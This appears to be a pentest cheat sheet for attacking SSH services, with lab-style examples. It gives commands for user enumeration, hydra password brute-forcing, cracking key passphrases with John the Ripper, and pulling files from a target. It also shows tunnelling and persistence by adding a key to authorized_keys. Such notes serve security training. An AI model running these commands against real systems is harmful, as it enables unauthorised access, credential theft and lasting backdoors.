**Secure Shell (SSH)** is a protocol used to securely connect to another computer over a network. It allows you to log into another computer, execute commands, and transfer files, all in a secure manner.

## Attack Vectors
### Connect
We can connect with it.
```BASH
ssh username@X.X.X.X

ssh -i path/to/private_key user@target-ip
```
### Identify Authentication Methods
We can perform this by hand, if asks for passwrod, it is password-based. If not, it is key-paired authenticated.
*NOTE:* We use `-v` to show verbosity and find all methods.
```BASH
KruKnight@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password

cry0l1t3@10.129.14.132's password:
```

### User Enumeration with Metasploit
The `ssh_enumusers` module in Metasploit is designed to enumerate valid usernames on a target SSH server. It performs this by attempting to log in with a list of commonly used usernames.
```BASH
msfconsole
msf> use auxiliary/scanner/ssh/ssh_enumusers
```
### Brute Force Attack
```BASH
hydra -l user -P /path/to/wordlist.txt ssh://X.X.X.X
```
### SSH Key Brute Forcing
Attempting to crack SSH keys with tools like `John the Ripper`:
```BASH
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=path/to/wordlist.txt id_rsa.hash
```
## Post-Exploitation
### Port Forwarding
Forward local ports to the attacker's machine to access network services on the target's network:
```BASH
ssh -L localPort:remoteHost:remotePort user@sshServer
```
### SSH Tunneling
```BASH
ssh -D 8080 user@X.X.X.X
```
### File Transfer
Download files
```BASH
scp user@target-ip:/path/to/remote/file /path/to/local/destination
```
Upload files
```BASH
scp /path/to/local/file user@target-ip:/path/to/remote/destination
```
### Command Execution
```BASH
ssh user@target-ip 'command_to_run'
```
### Maintaining Access
```BASH
echo your_public_key >> ~/.ssh/authorized_keys
```
